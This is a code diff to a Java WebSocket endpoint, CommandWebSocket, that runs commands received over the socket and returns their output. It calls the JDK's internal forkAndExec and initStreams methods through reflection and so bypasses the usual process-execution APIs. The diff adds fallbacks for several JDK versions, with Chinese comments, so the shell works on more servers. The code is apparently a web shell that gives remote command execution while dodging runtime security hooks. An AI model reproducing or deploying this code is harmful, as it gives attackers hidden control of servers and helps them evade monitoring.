@@ -7,6 +7,7 @@ import javax.websocket.EndpointConfig;
 import javax.websocket.MessageHandler;
 import javax.websocket.Session;
 import java.io.ByteArrayOutputStream;
+import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -38,6 +39,10 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
             session.getBasicRemote().sendText(outputStream.toString());
         } catch (Exception e) {
             e.printStackTrace();
+            try {
+                session.close();
+            } catch (IOException ignored) {
+            }
         }
     }
 
@@ -77,20 +82,33 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
         int[] std_fds = new int[]{-1, -1, -1};
         byte[] result = toCString(strs[0]);
         try {
-            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
             Field helperpathField = processClass.getDeclaredField("helperpath");
-            launchMechanismField.setAccessible(true);
             helperpathField.setAccessible(true);
-            Object launchMechanismObject = launchMechanismField.get(processObject);
             byte[] helperpathObject = (byte[]) helperpathField.get(processObject);
-            int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+
+            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
+            launchMechanismField.setAccessible(true);
+            Object launchMechanismObject = launchMechanismField.get(processObject);
+            int mode = 0;
+            try {
+                // JDK7 的某些版本
+                Field value = launchMechanismObject.getClass().getDeclaredField("value");
+                value.setAccessible(true);
+                mode = (Integer) value.get(launchMechanismObject);
+            } catch (NoSuchFieldException e) {
+                // JDK8+
+                int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
+                mode = ordinal + 1;
+            }
 
             Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                     byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
-            forkMethod.invoke(processObject, ordinal + 1, helperpathObject, result, argBlock, args.length,
+            forkMethod.invoke(processObject, mode, helperpathObject, result, argBlock, args.length,
                     null, envc[0], null, std_fds, false);
-        } catch (Exception e) {
+        } catch (NoSuchFieldException e) {
+            e.printStackTrace();
+            // JDK6 与 JDK7 低版本
             Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
                     byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
@@ -98,9 +116,15 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
                     null, envc[0], null, std_fds, false);
         }
 
-        Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
-        initStreamsMethod.setAccessible(true);
-        initStreamsMethod.invoke(processObject, std_fds);
+        try {
+            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
+            initStreamsMethod.setAccessible(true);
+            initStreamsMethod.invoke(processObject, std_fds);
+        } catch (NoSuchMethodException e) {
+            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
+            initStreamsMethod.setAccessible(true);
+            initStreamsMethod.invoke(processObject, std_fds, false);
+        }
 
         Method getInputStreamMethod = processClass.getMethod("getInputStream");
         getInputStreamMethod.setAccessible(true);
